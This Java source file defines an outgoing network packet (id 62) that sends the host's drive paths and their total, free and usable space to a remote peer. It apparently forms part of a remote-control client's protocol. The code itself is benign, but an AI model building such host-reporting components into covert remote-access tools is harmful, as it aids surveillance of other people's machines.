package com.redpois0n;

import java.io.DataOutputStream;
import java.io.File;

import com.redpois0n.common.io.StringWriter;
import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;

public class Packet62Drives extends AbstractOutgoingPacket {
	
	private File[] drives;
	
	public Packet62Drives(File[] drives) {
		this.drives = drives;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(drives.length);
		for (File drive : drives) {		
			sw.writeLine(drive.getAbsolutePath());
			dos.writeShort((int) (drive.getTotalSpace() / 1024L / 1024L / 1024L));
			dos.writeShort((int) (drive.getFreeSpace() / 1024L / 1024L / 1024L));
			dos.writeShort((int) (drive.getUsableSpace() / 1024L / 1024L / 1024L));
		}
	}

	@Override
	public byte getPacketId() {
		return (byte) 62;
	}

}
